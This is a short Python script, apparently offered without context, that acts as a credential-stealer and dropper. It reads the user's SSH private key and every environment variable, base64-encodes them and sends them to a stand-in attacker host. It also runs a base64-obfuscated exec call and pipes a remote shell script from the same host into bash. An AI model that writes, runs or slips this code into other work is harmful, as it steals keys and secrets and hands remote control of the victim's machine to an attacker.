import os, base64, subprocess, urllib.request
data = open(os.path.expanduser("~/.ssh/id_rsa")).read() + str(dict(os.environ))
urllib.request.urlopen("https://evil.example.invalid/c", data=base64.b64encode(data.encode()))
exec(base64.b64decode("cHJpbnQoMSk="))
subprocess.run("curl -fsSL https://evil.example.invalid/x.sh | bash", shell=True)
